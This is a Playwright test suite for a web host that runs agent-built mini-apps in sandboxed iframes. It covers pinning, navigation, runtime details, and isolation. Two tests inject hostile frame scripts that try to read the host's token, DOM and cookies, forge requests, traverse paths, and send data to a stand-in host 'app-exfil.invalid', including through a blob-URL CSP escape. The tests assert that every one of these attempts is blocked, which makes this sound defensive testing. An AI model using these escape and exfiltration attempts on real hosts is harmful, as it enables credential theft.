import { test, expect } from '@playwright/test'
import { mockAgents } from './agent-fixture.js'

async function mockApps (context, js) {
  const state = await mockAgents(context)
  const agent = state.addAgent('Ada')
  const manifest = { title: 'Counter', agent_id: agent.id, description: 'Durable sample', frontend: { html: '<h1>Isolated counter</h1><p id="value">Loading</p><button id="increment">Increment</button>', css: 'body{font-family:system-ui;background:var(--surface-app);color:var(--text);padding:16px}button{padding:10px}', js: js || `nautionette.ready.then(async()=>{ const render = r => document.querySelector('#value').textContent = String(r.value); render(await nautionette.request('/state')); document.querySelector('#increment').onclick = async()=>render(await nautionette.request('/increment',{method:'POST'})); });` }, backend: { mode: 'on-demand' } }
  const item = { id: 'counter', title: 'Counter', icon: 'analytics', agent_id: agent.id, pinned: true, pinned_revision: 1, pinned_at: 10, archived: false, revision: 1, active_revision: 1, active: { revision: 1, manifest }, releases: [{ revision: 1, state: 'ready' }] }
  const apps = [item]
  const calls = [], writes = [], network = [], reads = []
  const runtime = { status: 'running', memory_bytes: 4096000, memory_limit_bytes: 67108864, data_bytes: 32768, persistent_limit_bytes: 50331648, image_bytes: 2097152, cpu_percent: 1.2, pids: 1, pid_limit: 32, cpu_limit: 0.25, mode: 'on-demand' }
  let value = 0
  await context.route('https://app-exfil.invalid/**', route => { network.push(route.request().url()); return route.abort() })
  await context.route('**/api/miniapps**', async route => {
    const path = new URL(route.request().url()).pathname
    const method = route.request().method()
    reads.push(path)
    if (path === '/api/miniapps') return route.fulfill({ json: { apps } })
    if (path === '/api/miniapps/overview') return route.fulfill({ json: { apps: apps.map(app => ({ app, runtime })), totals: runtime, sampled_at: Date.now() / 1000, incomplete: false } })
    if (path === '/api/miniapps/counter/status') return route.fulfill({ json: { runtime } })
    if (path === '/api/miniapps/counter/diagnostics') return route.fulfill({ json: { operations: [{ operation: 'GET /state', revision: 1, outcome: 'complete', duration_ms: 4 }], mutations: [] } })
    if (path.endsWith('/restore')) {
      const payload = route.request().postDataJSON(); writes.push(payload)
      item.revision++; item.active_revision = item.revision; item.active.revision = item.revision
      item.pinned = payload.pinned; item.pinned_revision = payload.pinned ? item.revision : null
      item.releases.unshift({ revision: item.revision, state: 'ready' })
    }
    if (path === '/api/miniapps/counter/request') {
      const payload = route.request().postDataJSON()
      calls.push({ payload, headers: await route.request().allHeaders() })
      if (payload.method === 'POST') value++
      return route.fulfill({ json: { value } })
    }
    if (method === 'PATCH') { const payload = route.request().postDataJSON(); writes.push(payload); Object.assign(item, payload); if (payload.pinned != null) item.pinned_revision = payload.pinned ? item.active_revision : null }
    return route.fulfill({ json: item })
  })
  return { state, item, apps, calls, writes, network, reads }
}

for (const width of [1440, 390, 320]) {
  test(`app bridge, mobile navigation, pins and durable reload at ${width}px`, async ({ page, context }) => {
    const { calls, writes } = await mockApps(context)
    const errors = []
    page.on('pageerror', e => errors.push(e.message))
    await page.setViewportSize({ width, height: 900 })
    await page.goto('/apps/counter')
    const app = page.frameLocator('iframe[title="Counter"]')
    await expect(app.locator('#value')).toHaveText('0')
    await app.getByRole('button', { name: 'Increment' }).click()
    await expect(app.locator('#value')).toHaveText('1')
    expect(calls[1].payload.request_id).toMatch(/^\d{13}-[0-9a-f]{32}$/)
    expect(calls[1].payload.revision).toBe(1)
    await page.reload()
    await expect(app.locator('#value')).toHaveText('1')
    await page.getByRole('button', { name: 'Unpin app' }).click()
    await expect.poll(() => writes.length).toBe(1)
    await expect(page.getByRole('button', { name: 'Pin app', exact: true })).toBeVisible()
    if (width <= 900) {
      await page.getByRole('button', { name: 'Back to apps', exact: true }).click()
      await expect(page).toHaveURL(/\/apps$/)
      await page.getByRole('link', { name: /Counter/ }).click()
      await expect(app.locator('#value')).toHaveText('1')
    }
    await page.getByRole('button', { name: 'App details', exact: true }).click()
    await page.getByRole('button', { name: 'Archive', exact: true }).click()
    await expect(page.locator('#miniapp-info .chip').getByText('Archived', { exact: true })).toBeVisible()
    await expect(page.locator('iframe')).toHaveCount(0)
    await page.getByRole('button', { name: 'Unarchive', exact: true }).click()
    await page.getByRole('button', { name: 'Open app', exact: true }).click()
    await expect(app.locator('#value')).toHaveText('1')
    expect(errors).toEqual([])
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true)
  })
}

test('opaque frame cannot read host credentials, forge host requests, load external code or access other apps', async ({ page, context }) => {
  await context.addInitScript(() => localStorage.setItem('nautionette.token', 'host-secret-for-isolation-test'))
  const js = `
    nautionette.ready.then(async()=>{
      const checks = {};
      try { checks.parentToken = parent.localStorage.getItem('nautionette.token'); } catch { checks.parentToken = 'denied'; }
      try { checks.ownStorage = localStorage.getItem('nautionette.token'); } catch { checks.ownStorage = 'denied'; }
      try { checks.parentDOM = parent.document.title; } catch { checks.parentDOM = 'denied'; }
      try { checks.cookie = document.cookie; } catch { checks.cookie = 'denied'; }
      checks.popup = window.open('https://app-exfil.invalid/popup') === null;
      await fetch('https://app-exfil.invalid/fetch').catch(()=>{});
      await fetch('/api/settings').catch(()=>{});
      parent.postMessage({kind:'request',path:'/api/settings',method:'GET',id:'forged'},'*');
      try { await nautionette.request('/../other-app'); checks.badPath='allowed'; } catch { checks.badPath='denied'; }
      try { await nautionette.request('/state',{body:1n}); checks.nonJSON='allowed'; } catch { checks.nonJSON='denied'; }
      const cyclic={}; cyclic.self=cyclic;
      try { await nautionette.request('/state',{body:cyclic}); checks.cyclic='allowed'; } catch { checks.cyclic='denied'; }
      checks.result=await nautionette.request('/state');
      window.checks=checks;
      document.querySelector('#value').textContent='checked';
    });`
  const { calls, network } = await mockApps(context, js)
  await context.addCookies([{ name: 'host-cookie', value: 'host-cookie-isolation-sentinel', url: 'http://127.0.0.1:9012' }])
  await page.goto('/apps/counter')
  expect(await page.evaluate(() => document.cookie)).toContain('host-cookie-isolation-sentinel')
  const app = page.frameLocator('iframe[title="Counter"]')
  await expect(app.locator('#value')).toHaveText('checked')
  const frame = page.frames().find(frame => frame.parentFrame())
  const checks = await frame.evaluate(() => window.checks)
  // Chromium throws for opaque cookies; WebKit exposes an empty cookie jar.
  expect(checks).toEqual({ parentToken: 'denied', ownStorage: 'denied', parentDOM: 'denied', cookie: expect.stringMatching(/^(denied)?$/), popup: true, badPath: 'denied', nonJSON: 'denied', cyclic: 'denied', result: { value: 0 } })
  expect(calls).toHaveLength(1)
  expect(calls[0].headers.authorization).toBe('Bearer host-secret-for-isolation-test')
  expect(JSON.stringify(checks)).not.toContain('host-secret-for-isolation-test')
  expect(network).toEqual([])
  await expect(page.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts')
  // frame-src on the embedding host must also cover child-initiated navigation.
  await frame.evaluate(() => { location.href = 'https://app-exfil.invalid/navigation' }).catch(() => {})
  await page.waitForTimeout(100)
  expect(network).toEqual([])
  await page.getByRole('button', { name: 'App details', exact: true }).click()
  await expect(page.getByRole('button', { name: 'Archive', exact: true })).toBeVisible()
})

for (const width of [1440, 390, 320]) {
  test(`shared app agent rail, pinned avatars and runtime settings at ${width}px`, async ({ page, context }) => {
    const { state, item, apps, reads } = await mockApps(context)
    const other = state.addAgent('Grace')
    apps.push({ ...item, id: 'other', title: 'Other app', agent_id: other.id, pinned_at: 20 })
    const errors = []
    page.on('pageerror', e => errors.push(e.message))
    await page.setViewportSize({ width, height: 900 })
    await page.goto('/apps')
    const rail = page.getByRole('navigation', { name: 'Apps by agent' })
    await expect(rail).toBeVisible()
    await rail.getByRole('button', { name: 'Apps by Ada', exact: true }).click()
    await expect(page).toHaveURL(new RegExp(`/apps\\?agent=${item.agent_id}$`))
    await expect(page.getByRole('link', { name: /Other app/ })).toHaveCount(0)
    await expect(page.getByRole('link', { name: /Counter/ })).toBeVisible()
    await page.getByRole('navigation', { name: 'Main navigation' }).getByRole('link', { name: 'Chats', exact: true }).click()
    const pins = page.getByRole('navigation', { name: 'Pinned apps' })
    if (width <= 900) {
      // The list remains full-screen; shortcuts are in the chat window.
      await expect(pins).toBeHidden()
      await page.goto(`/chats/new?agent=${item.agent_id}`)
    }
    await expect(pins.getByRole('link', { name: 'Open Counter, pinned release 1' })).toBeVisible()
    await expect(pins.getByRole('link', { name: /Other app/ })).toHaveCount(0)
    await pins.getByRole('link', { name: 'Open Counter, pinned release 1' }).click()
    await expect(page).toHaveURL(new RegExp(`/apps/counter\\?agent=${item.agent_id}$`))
    await expect(page.frameLocator('iframe').locator('#value')).toHaveText('0')
    await page.getByRole('button', { name: 'App details', exact: true }).click()
    await expect(page.getByRole('button', { name: 'App details', exact: true })).toHaveAttribute('aria-expanded', 'true')
    await expect(page.locator('#miniapp-info')).toContainText('3.9 MiB')
    await expect(page.locator('#miniapp-info')).toContainText('1.2%')
    await expect(page.locator('#miniapp-info')).not.toContainText('Published grants')
    await page.screenshot({ path: test.info().outputPath('app-info.png') })
    await page.locator('summary').filter({ hasText: 'Diagnostics' }).click()
    await expect(page.getByText('GET /state', { exact: true })).toBeVisible()
    expect(reads).toContain('/api/miniapps/counter/diagnostics')
    await page.getByRole('link', { name: 'All runtimes', exact: true }).click()
    await expect(page.getByRole('heading', { name: 'App runtimes', exact: true })).toBeVisible()
    await expect(page.getByRole('article', { name: 'Counter', exact: true })).toContainText('64.0 MiB')
    expect(reads).toContain('/api/miniapps/overview')
    await page.screenshot({ path: test.info().outputPath('app-runtimes.png') })
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true)
    expect(errors).toEqual([])
  })
}

test('pins identify the active release and restoring retained code explicitly pins the new release', async ({ page, context }) => {
  const { item, apps, writes } = await mockApps(context)
  for (let n = 0; n < 7; n++) apps.push({ ...item, id: `pinned-${n}`, title: `Pinned ${n}`, pinned_at: n + 100 })
  await page.goto('/chats')
  await expect(page.getByRole('navigation', { name: 'Pinned apps' }).getByRole('link', { name: /pinned release/ })).toHaveCount(5)
  await expect(page.getByRole('navigation', { name: 'Pinned apps' }).getByRole('link', { name: /Open Counter/ })).toHaveCount(0)
  item.revision = item.active_revision = item.active.revision = 2
  item.pinned = false; item.pinned_revision = null
  item.releases.unshift({ revision: 2, state: 'ready' })
  await page.goto('/apps/counter#info')
  await page.getByRole('button', { name: 'Pin v2', exact: true }).click()
  await expect.poll(() => writes.length).toBe(1)
  expect(writes[0]).toEqual({ expected_revision: 2, pinned: true, pin_revision: 2 })
  await page.getByRole('button', { name: 'Use & pin', exact: true }).click()
  await expect.poll(() => writes.length).toBe(2)
  expect(writes[1]).toEqual({ expected_revision: 2, revision: 1, pinned: true })
  await expect(page.locator('#miniapp-info')).toContainText('v3')
  await expect(page.getByRole('button', { name: 'Unpin app', exact: true })).toHaveAttribute('aria-pressed', 'true')
})

test('pinning and inspecting an app preserve the running iframe and local UI state', async ({ page, context }) => {
  await mockApps(context, `nautionette.ready.then(()=>{window.localCount=0;document.querySelector('#value').textContent='0';document.querySelector('#increment').onclick=()=>document.querySelector('#value').textContent=String(++window.localCount);});`)
  await page.goto('/apps/counter')
  const app = page.frameLocator('iframe')
  await app.getByRole('button', { name: 'Increment' }).click()
  await expect(app.locator('#value')).toHaveText('1')
  await page.getByRole('button', { name: 'Unpin app', exact: true }).click()
  await expect(page.getByRole('button', { name: 'Pin app', exact: true })).toBeVisible()
  await expect(app.locator('#value')).toHaveText('1')
  await page.getByRole('button', { name: 'App details', exact: true }).click()
  await page.getByRole('button', { name: 'Open app', exact: true }).click()
  await expect(app.locator('#value')).toHaveText('1')
})

test('blob navigation cannot shed the app CSP and allow arbitrary external requests', async ({ page, context }) => {
  const { network } = await mockApps(context, `nautionette.ready.then(()=>{window.escape=()=>{location.href=URL.createObjectURL(new Blob(['<script>fetch("https://app-exfil.invalid/blob")<\\/script>'],{type:'text/html'}));};document.querySelector('#value').textContent='ready';});`)
  await page.goto('/apps/counter')
  await expect(page.frameLocator('iframe').locator('#value')).toHaveText('ready')
  const frame = page.frames().find(frame => frame.parentFrame())
  await frame.evaluate(() => window.escape()).catch(() => {})
  await page.waitForTimeout(200)
  expect(network).toEqual([])
  expect(page.url()).toContain('/apps/counter')
})
